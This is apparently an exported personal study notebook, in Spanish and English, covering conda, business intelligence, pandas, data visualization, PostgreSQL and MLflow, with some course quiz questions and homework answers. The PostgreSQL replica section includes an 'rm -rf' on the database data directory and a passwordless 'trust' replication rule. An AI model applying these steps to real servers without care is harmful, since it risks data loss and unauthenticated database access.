Deepnote
- servicio en la nube
- basado en JN
- no requiere conf
- trabajo a nivel de proyecto
- colaboracion en tiempo real
- integracion con multiple apps
- acceso a una terminar o linea de comando
- almacenamiento de variables de entorno
- publicar proyectos

#</rich_text>
      <rich_text family="monospace">Crear ambiente
conda create --name py39 python=3.9 pandas=1.2
#Ir al ambiente
conda activate py39
# Instalar boltons
conda install -c conda-forge boltons
#Devolver a un punto anterio y asi no tener que remover
conda list -r
#Devolverme a larevision 0
conda install --revision 0
#Revisar si esta instalado
conda list boltons
#Exportar tu ambiente
conda env export
#Exportar tu ambiente pero sin las versiones
conda env export --no-builds
#Exportar tu ambiente LA MEJOR
conda env export --from-history
#Exportar tu ambiente a un archivo
conda env export --from-history --file environment.yam
#Remover ambiente 
conda env remove --name py39
#Importar el ambiente
conda env create --file environment.yaml
#Ir al ambiente 
conda activate py39</rich_text>
      <rich_text>


VSCode a trav├ęs de extensiones te permite tener un ambiente de notebooks integrado. En ellos puedes:
¿Cuál de los siguientes servicios/tipos de Jupyter Notebooks te permite crear gráficas sin necesidad de código?
</rich_text>
    </node>
    <node name="bussiness intelligence" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651261296" ts_lastsave="1651514026">
      <rich_text>Introduccion
- concepto: inteligencia del negocio, utilizar informacion dentro de la organizacion para tomar decisiones
- pariente cercano de la ciencia de datos, analisis descriptivo, en pasado y presente
- generacion de reporte y descubrimientos de la informacion
- ETL, extract, transform y load
- exploracion, que se puede encontrar que explica lo que esta pasando
- descubrimientos, patrones
- reporting, se concentra la informacion para la audiencia
- como??
   → visualizacion de datos
   → storytelling
   → recomendaciones
- importancia
   → ayuda para mejorar productos y procesos dentro ded la empresa

Stakeholders
- personas o grupos que rodean a la empresa, personas de interes
- accionistas, clientes, empleados, proveedores, sociedad, gobierno
- esto nos ayuda a tener mas claro a quien va dirigidos los intereses
- se tienen que entender los intereses
- se deben de priorizar
   → empresa tradicional
      ⇒ accionistas
      ⇒ clientes
      ⇒ empleados
   → startup
      ⇒ clientes
      ⇒ empleados
      ⇒ accionistas
- el BI tiene que salvaguardar los intereses de los stakeholders

Tipos de empresas
- se hace el analisis por que es muy distinto una de otra
- se tiene que entender la afectacion de cada una de las actividades cotidianas
- utilidad bruta = ingresos - costos de venta
- utilidad operativa = utilidad bruta - gastos de administracion (todo aquello que no esta relacionado con la produccion)
- utilidad neta = utilidad operativa - otros gastos e inresos - impuestos
- venta de productos
   → costos de venta, son las ventas - costos de ventas
- venta de servicios
   → generalmente los costos de venta no afectan tanto, el software es un ejemplo, se gasta mas en nomina y gastos administrativos

Income statement simplificado
- si no hay utilidad bruta, se debe detener y arreglar o cerrar la empresa
- si la operativa esta tan baja con la bruta, los gastos administrativos estan muy caros, se debe reducir la operativa con la bruta
- como afecta cada actividad y saber que es lo que se quiere mejorar
- afectacion distinta
   → costo en materia prima, si aumenta utilidad bruta disminuye
   → incremento en nomina, incremento en gastos operativos utilidad operativa disminuye
   → cambios en oficina, si aumenta, disminuye la utilidad operativa
   → aumento presupuesto de marketing, costos de operacion, utilidad operativa disminuye, se ve como un aumento de ventas
   → cambio en el precio del producto, utilidades brutas, pueden aumentar o disminuir las ventas
- se debe de pensar de lo particular a lo general

- ingreso, es todo aquello que no se le ha sustraido los gastos o costos de los bienes
- utilidad, es cuando al ingreso se le extraen los costos o gastos, mayort ingreso no significa mayor utilidad
- costos
   → costo fijo, costos que son constantes, por ejemplo la renta
   → costo variable, se pueden identificar a una actividad, a mayor actividad mayor costo
   → semivariable, puede cambiar o mantenerse
   → mayor costo no siempre significa menos utilidad

Margen de contribucion:
- elemento con que podemos entender las cosas como un pequenio resumen
- la diferencia entre el precio de los productos menos el costo de los productos
- nos ayuda a encontrar un punto de equilibrio, no hay ganancias ni perdidas, cuanto se tiene que vendar para no perder ni ganar
- PE = costos fijos / (precio venta - costo variable por unidad)

Razones matematicas en los negocios
- definicion, relacion entre dos magnitudes o valores
- se debe pensar en porcentajes
- utilidad / ingresos
- margen de contribucion / precio
- ventas de producto a / ventas totales

Extraccion de datos
- se tiene que tener muy en cuenta los ETL
   → se debe de ser cuidadoso con los extract, ya que no siempre hay informacion cierta
   → se puede encontar la informacion de silos, no siempre lo que se encuentra en un departamente esta en otro departamento
   → hay que tener cudadido con el uso de los software, SAP, Excel, Google Studio
- tipos de archivos para extraccion
   → excel, texto de csv

Limpieza de datos
- se debe procurar que todo lo que extrajimos es entendible
- garbage in, garbage out
- este es el primer acercamiento, donde se puede entender lo que tenemos de informacion

Exploracion de datos
- se hace para saber que nos dicen los datos
- se hacen preguntas que no sabiamos que existian
- que es lo que hace que sucede en ciertos patrones
- pueden llegar a cambiar las preguntas e hipotesis sociales
- software mas comunes
   → se peude usar python o R
   → programas como excel, tableu, power bi

Descubrimientos, highlights,
- los high nos ayudan a tomar las decisiones
- siempre empezar con lo mas buscado y lo menos buscado (bottom and top data)
- encontrar patrones o temporalidad
- esfuerzate en enteder la data

Reporting
- pensar en la audiencia
- pensar en el mensaje, como se va a transmitir
- saber si el mensaje va a ser estatico o dinamico, impreso es un reporte estatico, usar power bi y tableu para reportes dinamicos
- tener buenas practicas visuales
- contexto, dashboards y storytelling, la audiencia debe de saber de que se habla
- Descripcion, descubrimientos y sugerencias

Alertas, automatizacion y live reporting
- el li e reporting es el reporte en vivo, un problema es la falta de tiempo real al hacerse este analisis
- se automatiza por medio de software
- lertas, KPI, metrivas y colores (tomarle cierta atencion al reporte en el momento)

Eficiencia, max profit y min cost
- la eficiencia nos ayuda a mejorar un proceso, y los recursos dedicados a este proceso
- siempre tenemos que buscar la utilidad
- siempre se debe de intentar minimizar los costos
- siempre pensar en la jerarquia ded los stakeholders


La nĂ³mina es un ejemplo de costo...
Elige la f√≥rmula para encontrar el punto de equilibrio, utilizando el margen de contribuci√≥n
Podemos saber mucho sobre la empresa simplemente leyendo el estado de resultados. Esto es: 
Si tu proveedor de materia prima decide aumentar el precio de los materiales con los que fabricas tus productos, ¿qué utilidad se vería afectada? Considera que todo lo demás permanece igual.


¿Qué significa ETL?
¿Cuáles son las fases del proceso de Business Intelligence?
Si tu proveedor de materia prima decide aumentar el precio de los materiales con los que fabricas tus productos, ¿qué utilidad se vería afectada? Considera que todo lo demás permanece igual.
</rich_text>
    </node>
    <node name="numpy-pandas" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651261091" ts_lastsave="1651528707">
      <rich_text>Numpy
- es muy veloz, 50 veces que usar listas en python o en C
- optimiza almacenamiento en memoria
- maneja distintos tipos de datos
Pandas
- herada ventajas de numpy
- maneja multiples archivos, formatos
- alineacion inteligente
- se puede hacer analitica, etls y mas

Array
- estructura central de NP
- representa datos de manera estructurada
- indexado
- acceso a uno o muchos elementos

Tipos de datos
- ints

Dimensiones
- scalar dim 0
- vector dim 1
- matriz dim 2
- tensor dim &gt;= 3

Se tienen series y dataframes
las series es un arreglo unidimensional, busqueda por indice y slicing, operacion aritmeticas y manejo de varios tipos de datos
dataframe, es una estructura matricial, estructura principal, de dos dimensiones, indices en filas y columnas</rich_text>
    </node>
    <node name="visualizacion de datos" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1623292658" ts_lastsave="1655388356">
      <rich_text># Que es la visualización
- el input: es la parte donde se inicializa la visualizacion de datos, se pone de forma estructurada o no estructurada
- el output: es el producto final que sirve para reconocer patrones de forma visual
- para que se usa: reconocer patrones, historias...
- es importante por que estamos en la era de la informacion

### Florence Nightingale

# Importancia
- la dificultad para retener informacion del humano
- carga cognitiva: es el esfuerzo para retener la informacion
- nos ayuda a entender nuestra información
- ben Shneiderman, la visualizacion da respuestas a preguntas que no sabias que tenias
- sirve para comunicar mejor

# Buenas practicas
- define la audiencia y motivo
- utilizar la percepción visual
- estandariza, no usar tendencia engañosa, usar mismas medidas con compartivas, no cortar axis, alinear siempre
- simplificar pero no recortar
- disminuye el sesgo... no tener las preferencias personales
- no al cherry-picking, retomar o tomar datos que solo muestran nuestro punto
- principios gestalt, ley de proximidad, ley de similitud, ley de la continuidad

# Conflictos de ética
- la audiencia cree y escucha lo que mostramos
- credibilidad y mensaje, si se pierde la confianza es dificil volver a obtenerla, los datos deben contar sus propias historias
- segmentación

# Graficas
- son importantes para enviar mensajes, en especial para gente que no tiene tiempo de hacer interpretacion de los datos
- dataviz, termino de visualizacion
- de barras:
   → es una representacion de barras
   → hace comparacion rapida
   → son datos por categorias, que se agrupan por frecuencias
   → existen de diferentes formas, verticales, horizontales y de stack(aqui se une el 100%)
   → se debe usar un color distinto para cada categoria
   → representar de mayor a menos a menos que sea escala de tiempo
- de pie (pastel):
   → es un circulo, donde las categorias tienen una representacion por área
   → debe de ser muy sencilla
   → se puede simplificar en una grafica de dona
   → se peuden poner anotaciones para ver el valor preciso
   → no usar graficas en 3D afectan la percepsion visual
   → no usar mas de 6 categorias
- dispersion:
   → es posicionar en un plano dos variables, es la mas comun en la ciencia de datos
   → colores son importantes
   → se debe entender la dispersion de los datos en lo plano
      ⇒ correlacion positivo
      ⇒ correlacion negativa
      ⇒ sin correlacion
   → no poner muchas anotaciones ya que ocupa muchos puntos
- de burbujas:
   → es una variacion de la scatter plot
   → muestra el tamaño de la populacion
   → no debe de tener necesariamente un grafico con correlacion de grafica
   → uso de colores para definir categorias
   → no usar graficos 3D
- de mapas:
   → datos ubicados geograficamente
   → simplificar anotaciones
- heatmap:
   → permite sobreponer sobre otra visualizacion una paleta de colores, que nos ayuda a saber la frecuencia que tenemos
   → nos muestra los lugares en donde mas se repiten sucesos
   → se pueden usar dentro de graficas de tabla
   → se usa mucho sobre paginas web, para saber por donde pasan mas los cursores
   → calibrar la paleta de colores
- tablas:
   → representacion de manera ordenada
   → se utiliza cuando se quiere entregar un mensaje acompañado de otro datavis
   → solo si son expertos en la materia, no utilizar datos extensos

# Como afecta en el bussiness
- direccion y gerencia, estan corto de tiempo, entender en el menor tiempo posible, bajando la carga cognitiva
- nos sirve para comunicarnos con el propio equipo
- eficiencia y mejora

# Explora, descubre y pregunta
- los datos son numero o letras
- ofrecer informaciòn relevante
- explorar en las bases de datos o informacion para conocer que se tiene ahi
- trabajar en equipo es fundamental
- tomar decisiones por medio de lo anterior

# Business intellingence
- referido a informaciòn del negocio
- data visualization, lo usa para interpretar desiciones para las altas gerencias
- generalmente es gente que entienden el negocio
- ellos identifican los movimientos principales y conocen cada medida para mejorar el negocio

# Recoleccion de datos
- los datos son muy diversos
- se tienen bases publicas y privadas
- la informacion puede venir de informacion estructurada y no estructurada
- distintos tipos de archivos y fuentes

# Limpieza de datos
- estandarizar formato
- GIGO / RIRO, entra basura, sale basura, se tiene que limpiar lo mejor que se puedan los datos
- preparacion -&gt; visualizacion

# Exploracion de datos
- Descubrir, preguntar, reformular y analizar
- es importante contar historias
- evitar errores, bias, cherry picking

# creacion de graficas
- se usa para entregar mensaje a los altos mando
- que quiero comunicar
- que se adapta mejor a mi mensaje
- quien es mi audiencia
- no olvidar las buenas practicas

# Generacion de reportes
- son aglomerado de las data viz
- son para la audiencia para que se tomen decisiones
- concentrar los resultados, se debe enfocar en un solo mensaje
- a mayor retencion menor esfuerzo, carga cognitiva baja

# Definir KPI
- sirven para saber si se puede mejorar o no
- dependen del area donde se este, estos son especiales para cada area donde uno se encuentre
- SMART:
   → </rich_text>
      <rich_text weight="heavy">S</rich_text>
      <rich_text>pecific
   → </rich_text>
      <rich_text weight="heavy">M</rich_text>
      <rich_text>easurable
   → </rich_text>
      <rich_text weight="heavy">A</rich_text>
      <rich_text>chievable
   → </rich_text>
      <rich_text weight="heavy">R</rich_text>
      <rich_text>elevant
   → </rich_text>
      <rich_text weight="heavy">T</rich_text>
      <rich_text>ime-bound</rich_text>
    </node>
    <node name="Visualizacion de datos tableau" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1651530656" ts_lastsave="1652027094">
      <rich_text>Por que es importante aprender
- fundamental,representacion graficade informacion
   → input: informacion (data)
   → output: revelaciones (insights) e historias
- se tiene muchos datos, la visualizacion nos ayuda a encontrar las historias dentro de esos datos

Tableau:
- excel es de las primeras herramientas donde se pueden visualizar datos
- power BI, transicion natural del excel al BI
- google analytics, para mercadotecnia, generalmente para campanias y anuncios
- tableau, permite hacer dashboards, visualizaciones y narracion de datos
- se maneja bastante arrastre y suelte
- la comunidad es una de las mas importante en la visualizacion de datos
   → cda lunes se tiene un makeoverMonday
   → Viz o the day es la mas bonita de todos
   → ironviz todos los nominados de makeoverMonday pasan a esta parte
- errores mas comunes
   → se deen de usar buenos colores, dependiendo del contexto
   → los valores comparativos deben de ser identicos y estandarizados
   → en un reporte se debe de hacer eficiente que se quiere demostrar
   → rerevisar tipo de presentacion, dinamica o estatica
   → se debe tener un color diferente para cada categoria
   → grafica de arbol??
- defiir proposito de las visualizacion
   → cual es el mensaje
   → se debe definir el tipo de perfil, se le debe de poner un nombre, predecir preguntas que podriamo tener
   → como lo hare
   → preguntas claves que debe responder la presentacion

Storrytelling
- story board en tableau
- se presentan los descubrimientos en forma de historia
- se debe definir la estructura de la historia
   → contexto
   → resumen
   → puntos de interes
   → conclusiones
   → recomendaciones
</rich_text>
    </node>
    <node name="visualizacion de datos python" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652031812" ts_lastsave="1655388334">
      <rich_text>la visualizacion de los datos es importante por que da respuesta  de preguntas que no sabiamos que teniamos, se pueden tener datos distintos con los mismo estadisticos
ayuda a entontrar hallazgos en los datos de forma mas facil
mucho uso en DS e IA para sabe que tan bueno es el modelo
matplotlib
	- 2003
	- basada en numpy
	- emula matlab
	- escrita en python
	- es bastante simple
	- es rapida
	- es personalizable
seaborn
	- esta montada sobre matplotlib
	
Metodo orientado a objetos:
- pyplot
   → rapido
   → facil
   → una sola figura
- OO:
   → mayor personalizacion
   → mas amigable a multiples diagramas
   → mas codigo

Seaborn
- construido sobre matplotylib
- integrada para estructuras de pandas
- velocidad
- poco codigo
- customizable

Set
- sirve para definir temas, colores, paletas que se van a usar

Sentencia de Matplotlib para crear un lineplot de x, y con puntos azules:
¿En la sentencia de Matplotlib "fig, axes = plt.subplots(nrows=1, ncols=2)" axes de qué tipo se le asigna un objeto?
</rich_text>
    </node>
    <node name="postgresql" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1654044994" ts_lastsave="1655318818">
      <rich_text>postgres es un motor de base de datos,
lenguaje, PL/PSQL
servidor, es donde se instala el motor, fisico
motor, es el que permite estrucutrar todo dentro del server

ACID:
A - atomocity, se peuden separar las funcion en pequenias tareas y unidas en un todo
C - consistency, todo lo que se relaciono al objeto relacional, los datos tiene congruencia entre si
I - isolation, se pueden tener varias tareas ejecutandose al mismo tiempo
D - durability, se tiene la seguridad de que no se pierde la informacion

se debe de crear la base: transporte_masivo, tabla viajero (id_viajero, nombre, fecha_registro)
usar version 11.5

consola, acceso por psql:
- \l , lista todas las bases de datos
- \dt, tablas que tiene la base de datos
- \c {nombre base de datos}, para cambiar la base de datos
- \d {tabla}, sirve para describir la tabla
- \h, para obtener todas las funciones
- \h {funcion}, nos muestra la documentacion de la funcion
- \g, permite volver a ejecutar la consulta anterior
- \timing, esto ayuda a saber cuanto se tardo en demorar los queries

archivos de configuracion
- tres archivos:
   → postgresql.cong
   → pg_hba.conf, aqui se modifica como sera el acceso para la base de datos
   → pg_ident.conf, permite mapear usuarios del usuario con el usuario de la base de datos
- en pgadmin:
   → SHOW config_file;
- el archivo esta generalment en la carpeta de configuracion
- </rich_text>
      <rich_text link="webs https://pgtune.leopard.in.ua/">https://pgtune.leopard.in.ua/</rich_text>
      <rich_text>

tipos de datos:
- numericos
- monetarios
- texto
- binarios
- fecha/hora
- boolean
- geometricos
- direccion de red
- tipo bit
- XML, JSON
- arreglos

Disenio de la base de datos:
- estation
   → id
   → name
   → direction
- train
   → id
   → model
   → capacity
- pasajero
   → id
   → name
   → address
   → date
- trayecto
   → id
   → name
   → id_train
   → id_station
- viaje
   → id
   → id_pasajero
   → id_trayecto
   → inicio
   → fin

tablas
- tiene la estructura e informacion de la base de datos
   → CREATE, crear tabla
   → ALTER, alterar la tabla
   → DROP, borra la tabla

particiones
- sirven para cuando se tiene mucha informacion en una tabla
   → separacion fisica de datos, se guardan varias partes de la tabla en el mismo o diferentes discos
   → estructura logica, se puede usar el mismo select, pero se pueden separar por fechas por ejemplo

Roles
- que puede hacer:
   → crear y eliminar
   → asignar atributos
   → agrupar con otros roles
   → roles predeterminados
- se debe de crear un usuario con los permisos necesarios para no borrar algo que no se deba de borrar

LLaves foraneas
- aqui deben de ser congruentes si existe en una tabla debe de existir en la otra
- tabla de origen
- tabla destino 
- acciones

SQL Join:
- teoria de conjuntos implementada en sql
- JOIN == INNER JOIN

Funciones especiales:
- On CONFLICT DO {action}, soluciona problemas para insertar datos o modificar, que no se puedan hacer y que despues podemos arreglar
- RETURNING {campo}, devuelve todos los cambios que se hicieron
- LIKE/ILIKE, busqueda estilo expresiones regulares
- IS/IS NOT, permite comparar dos tipos de datos no estandar
- COALESCE, compara dos valores, regresa el que no es nul
- NULLIF, compara dos valores y si son iguales ergresa nulo
- GREATEST, Compara un arreglo de valores, regresa el mayor
- LEAST, Compara un arreglo de valores, regresa el menor
- BLOQUES ANONIMOS permite agregar condicionales dentro de una consulta de datos

VISTAS:
- se usan mucho cuando la consulta se repite muchas veces
- volatiles, valores mas constante de consultar, tiende a cambiar si cambian los datos
- materializadas: persistente, sirve para datos de un dia atras
- sirve para ejecutar algo mas simple
- cuando la vista materializada no tiene datos, falla, se usa REFRESH para traer los datos

PL/SQL
- procedimientos almacenados
- se desarrolla codigo dentro de la base de datos
- para crealas se tiene que hacer
   → DO $$ {codigo} $$
   → RAISE NOTICE, lanza un error en consola
   → DECLARE se usa para variables, {rec} {record|type} := {value}, con record se trae toda la fila
   → FOR rec {SELECT} LOOP

TRIGGER:
- dispara acciones que se activan cuando pasa un insert, update o delete en una tabla
- para trigger se debe de cambiar el retorno, se regresa un TRIGGER
- si ponemos OLD no se hace el cambio
- si se pone NEW si se permite el cambio

Datos externos:
- DBLink, conexion a datos remotos con una consulta

Backups y restauracion
- pg_dump, custom (formato unico), tar (comprimido), plain(sql plano), directory (estructura sin comprimir), se puede seleccionar todo lo que tiene la base o solo datos, tablas...
- pg_restore

Mantenimiento:
- se hace sin nuestro concentimiento, trabajan en segundo plano
- Vacuum, vaciado, quita lo que no esta funcionando
   → liviano, lo hace constantemente
   → full, bloquea las tablas para hacer la limpieza, en tablas muy grande
- se puede hacer a nivel de base de datos o de tablas
- vacuum, la mas importante
   → full, quedara limpia en su total
   → freeze, durante el tiempo se congela
   → analyze, el mas suave, aplica revision y no aplica cambios
- analyze, no hace cambios en la tabla, hace la revision y dice como esta la tabla
- reindex, aplica para tablas que tienen indices entre ellos, pasa si los indices son mas grandes que las tablas 
- cluster, reorganiza la informacion en el disco

Replicas
- mecanismos que permiten evitar probelmas de entrada y salida en los OS
- piensa siempre en modo replica
- IOPS, limitante a nivel de OS, 

Crear dos servidores
- master
   → en configuracion
      ⇒ wal_level = hot_standby
      ⇒ max_wal_senders = 2
      ⇒ archive_mode = on
      ⇒ archive_command = ‘cp %p /tmp/%f’
   → en pg_hba.conf
      ⇒ host   replication   all   {ip}/32    trust
   → se debe reiniciar
- replica
   → se debe de parar
   → se borra rm -rf /var/lib/psql/data/*
   → pg_basebackup -U {user} -R -D /var/lib/pgsql/data/ -- host={ip_master} --port={port}, se copia la base
   → se modifica en configuracion
      ⇒ hot_standby = on
   → se reinicia


POSTGRES para ciencia de datos

historia de las bases de datos
- se usaban de manera texto, manera plana un txt, obtener estos datos era complicado y mas procesarlos
- es un esfuerzo matematico para hacer algo mas complejo

Puntos fuertes:
- se cree que estan un poco obsoletos, cosa no cierta
- multiproposito
- ampliamente utilizadas
- informacion consistente
- flexible
- retrocomplatible
- complemente programable, permite usar lenguajes para hacer algo ams complejo que un CRUD

Conceptos:
- entidades/tablas: cosas del mundo real
- atributos: son los atributos que tienen las entidades
- relaciones: conexiones entre entidades
- trigger, son funciones a ligar los store procedur con un evento
- store procedure, funciones o procedimientos que se guardan en el manejador de base de datos una y otra vez, sin repetir codigo

Principales sentencias SQL
- se usan las mismas que postgresql

Que es la ciencia de datos:
- el cientifico de datos comunmente lidera el equipo
- se requiere saber cual es lo que el negocio require y las necesidades de datos, para accionar con los demas equipos
- se debe entender el negocio, ya que lo ams grande que hace es el impacto que tiene sobre la empresa
- generalmente en las startup se es one man army, que es el que hace todo con data
- aplicacion:
   → la parte mas fundamental es en la toma de decisiones
   → data driven: se toman las decisiones basadas en datos, se debe de saber que representan
   → informacion significativa, tiene que ver con la historia a contar de los datos, sabiendo que se puede aprovechar
   → formato de acuerdo para el publico adecuado
   → neutralidad de datos, tener cuidado con la discriminacion mas con los datos que se toman
   → se tiene que contar una historia
- equipos orientados a datos:
   → DBA, el administrador de base de datos, es el primer rol creado
   → Data warehouse, almacen de datos, cuando ya no es posible en 1 o 2 servidores, para guardar millones de datos
   → ETL/Data pipelines, obtener datos, transformarlos y guardarlos en otro lado
   → BI, inteligencia del negocio, precursor del data science, traer los datos y entender los patrones que nos estan dando
   → ML, tecnica que ayuda para clasificacion de gran cantidad de datos o predecir basandose en data historica
   → data science, entender a la organizacion e impactar de forma positiva, las necesidades de la organizacion y planear un camino
- ds vs ml
   → machine learning, es un conjunto de ciencias, estrategias y algoritmos para usar en la compu, con esto se pueden resolver varios problemas, existen 2 tipos:
      ⇒ clasificacion, toma datos y encuentra en los datos grupos, patrones por medio de ciertas caracteristicas
      ⇒ predicciones, toma datos historicos, con fecha y temporalidad, por medio de patrones busca la tendencia que hay en ellos
   → ciencia de datos, tiene que ver mas con conocer a la organizacion o empresa, puede ser por medio de un equipo o uno solo
      ⇒ debe de impactar de forma positiva a la organizacion
   → ml es una herramienta fundamental para el data science
   → la herramienta adecuada para el trabajo adecuado

Diferencias entre manejadores
- filosofia de codigo abierto y orientado a la comunidad
- sumamente adaptable, manejo de documentos json, funciones orientadas a estdistica, lenguaje PSQL
- se dedica a manejo de objetos OOB
- se tienen particiones
- common table expresion, tablas virtuales, se crean en momento
- window function, encontrar relacion entre un row y el resto de registros

PLPGSQL
- programacion mas ordenada y procedural
- para creacion de triggers
- se ejecutan los pasos del procedimiento pero no se extrae ningun valor
- existen stored procedure (son estandar y no regresan valor) y function (no son estandar, mas avanzadas y regresan un valor)

en postgresql se tienen tipos de datos especiales, que son los datos que crea el usuario (aparte de los JSON)
tipo de dato lista, sirve como validador

Pensando en la presentacion de los datos
- el reto es mas grande es saber que datos debemos extraer y como mostrarlos
- planeacion
   → es hacia donde queremos hacer todo lo demas
   → saber que queremos probar con nuestros datos
   → como obtener los datos de acuerdo al proposito que tenemos
- la forma mas comun para este tipo de informacion son los dashboard
   → tienen diferentes significados, dependera de l uso o lo que queremos saber
   → la presentacion siempre es muy importante

Trabajando con objetos (json)
- generalmente se guarda un cadena, donde generalmente se vuelven mas lentas y complicadas
- PG tiene dos implementacion JSON y JSONB (es mas veloz JSONB)
- como extraer la data json

Agregando objetos
- sumarizacion de datos, obtener cosas como maximos, minimos, promedio y demas

Common table expression
- se usan para ahorrar memoria
- lenguaje pensado para consulat de datos estructurado
- no tiene estructuras de control ni iterativas, para eso se usan las common table expresion
- manejo de WITH RECURSIVE

Window Functions
- relacionar un row con otros row dentro de la tabla
- generalmente se usan para hacer ranking
- dense rank, diferencia cuando se tiene un rango igual

Particiones
- son de manera explicita
- casi todas lo hacen, pero lo hacen internamente para mejorar los datos
- cada seccion contiene un rango
- en las particiones no existen como tal las llaves primarias
- aqui el indice y clave es por donde se particiono la tabla</rich_text>
    </node>
    <node name="Machine learning" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1654702111" ts_lastsave="1667764572">
      <node name="ML y DS en python3" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1654702126" ts_lastsave="1654702126"/>
      <node name="MLOps" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="11" is_bold="0" foreground="" ts_creation="1652713315" ts_lastsave="1656961210">
        <rich_text>- first week
   → putting ml in production
      ⇒ good use of tools and practice
      ⇒ goal: predict the duration of a taxi trip
      ⇒ desing -&gt; train -&gt; operate, using an API to calculate aprox time of trip
   → env. preparing
      ⇒ use AWS platform
      ⇒ creating an EC2 instance
         • Ubuntu
         • x86-64
         • using t2.xlarge (4vcpu - 16 GiB ram - 30Gb rom)
      ⇒ adding configuration to ssh/config to connect
      ⇒ use anaconda with python, to avoid licence in anaconda push ‘q'
      ⇒ another tolls is docker and docker compose
      ⇒ export PATH="${HOME}/soft:${PATH}" to use docker-compose ?_?
   → experience with programming (python)
   → being comfortable with command line
   → exposure to ML is helpful
   → dataset used is NYC taxi
   → only use of year 2011 and nexts
   → D
   → #66DaysOfMLOps
- is necesary the order in the notbook, for example:
   → read_data
   → train and validate data
   → multiple ml
   → save of model in bin
   → the model contains experiment tracker and model registry
- load an prepare data
- vectorize the values -&gt; dct values
- train in different values -&gt; model
- machine learning services, to check time of trip
- the model is deploy and before is necesary the monitoring, to check that model is effective, exclude de human using the pipeline to create model v2

Experimenting Tracking
- concepts:
   → ML experiment: the process of building an ML model, A/B testing
   → Experiment run: each trial in an ML experiment, start playin with data and hiperparameter
   → Run artifact: any file that is associted with an ML run
   → Experiment metadata
- Experiment tracking:
   → (using differents version of data, multiple experiments):
   → process of keeping track of all relevant infromation
      ⇒ Source code
      ⇒ environment
      ⇒ data
      ⇒ model
      ⇒ hyperparameters
      ⇒ metrics
   → why is important?:
      ⇒ main, to get a history and know what changes have the model
      ⇒ reproducibility
      ⇒ organization
      ⇒ optimization
   → in spreadcheets:
      ⇒ why is not enough?
         • Error prone
         • No standart format
         • Visibility &amp; collaboration
         • Copy and paste the values and results (human error)
         • if a new DS read this, probably is very difficult to he
         • the collaboration is fundamental
   → MLFlow
      ⇒ Open source platform for ML Lifecycle
         • tracking
         • models
         • model registry
         • projects
      ⇒ allows you to organize experiments and track of:
         • parameters
         • metrics
         • metadata, for example tags to search
         • artifacts
         • models
      ⇒ extradata:
         • source cide
         • version of code (git commit)
         • start and end time
         • author
- Getting started with MLFLOW
   → is necesary requirements
   → reqs is a good practice
   → using conda to create env.
   → pip install -r requirements.txt
   → pip list to show packages and version
   → to run mlflow:
      ⇒ mlflow ui --backend-store-uri {str_conn}
   → if the experiment does not exists is created
- Experiment tracking
   → add parameter tuning tieh notebook
   → show how it looks
   → select the best
   → autolog
   → more logging in this mlflow
   → is possible see different visulization of runs
- machine learning lifecycle:
   → data sourcing
   → data labeling
   → data version
   → Model Management:
      ⇒ experiment tracking
         • model training
         • model evaluation
         • model architecture
      ⇒ model versioning
      ⇒ model deployment
      ⇒ **scaling hardware
   → prediction monitoring
   → folder system
      ⇒ error prone
      ⇒ no versioning
      ⇒ no model lineage
- model registry
   → the new implementing model, and is necesary deploy the model
   → is very difficult if only gets one email with the model, for example if fails in prod is not posible the rollback
   → model registry, models with parameters, tracks
   → with the registry is possible know what model is used in that stage
   → manage different stages, staging, production and archive
   → by default if one model is send to stage and exists another model in this state the existing is send to archived, but is possible send to stage, unmark when send another to archived
   → model managment provides:
      ⇒ model lineage
      ⇒ model versioning,
      ⇒ stage transitions
      ⇒ annotations

HomeWork 2
- version: 1.26.0
- num file in output folder: 4
- parameters: 19
- --default-artifact-root
- best rmse: 6.628
- best rmse: 6.55

MLFLOW in practice
- different scenaries:
   → a single data scientist, competition model
   → a cross-functional team with one data scientist, one model
   → multiple data scientist on multiple models
- differnet configurations
   → backend store
      ⇒ local
      ⇒ SQLAlchemy compatible
   → artifacts store
      ⇒ local
      ⇒ remote (s3...)
   → trackign server
      ⇒ no tracking server
      ⇒ localhost
      ⇒ remote
- in the folder 02/examples, exists files with the 3 scenaries
   → in first scenario is created by default a folder with name mlruns, with folder 0 and using yml meta
   → in case of new experiment is create folder with number 1 and save all data in artifacts
   → if run mlflow ui with the folder created by default this load the files
   → in scenario 2, this is using local database, and tracking server, is used if I need test with multiple hyper params in the model
   → in this escenary is necesary use the mlflow server and add the artifacts-save
   → created one folder artifacts_local, in this is saved the artifacts of model with metadata
   → scenario 3, this multiple DS working in multiple models, the remote server is in EC2, s3 buckets and using postgres db
   → in this scenario is used the url of server and the aws profile
   → a good practice of devops is create a role for the instance that connect to s3, is not a good idea use a user IAM
   → other good practice is: the db without external connection only for the ec2
   → in this scenario the artifacts is saved in s3
   → remote benefits:
      ⇒ shared experiment
      ⇒ collaborate
      ⇒ give more visibility of the data
   → issues
      ⇒ security, restrict access to the server
      ⇒ scalability
         • check deploy mlflow on aws farget
         • check mlflow at company scale
      ⇒ isolation
         • define standard for naming experiments, models and a ser of default tags
         • restrict access to artifacts
   → limitations
      ⇒ Auth and User
      ⇒ data versioning
      ⇒ model/data monitoring &amp; alerting, this is outside of the scope of MLFlow
   → alternatives:
      ⇒ neptune
      ⇒ comet
      ⇒ weights &amp; biases

- Negative engineering and workflow (orchestration)
